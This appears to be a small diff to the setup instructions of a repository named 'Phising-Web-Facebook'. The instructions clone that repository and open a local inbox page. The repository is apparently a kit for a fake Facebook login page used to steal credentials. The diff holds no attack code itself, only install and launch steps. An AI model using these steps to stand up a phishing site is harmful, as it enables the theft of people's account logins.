@@ -30,6 +30,6 @@ cd desktop &&
 sudo install git &&
 git clone https://github.com/AnonsKrekerDarkerAnonymous/Phising-Web-Facebook &&
 cd Phising-Web-Facebook &&
-ls && 
+ls && open localhost:8080/inbox.html
 
 ```
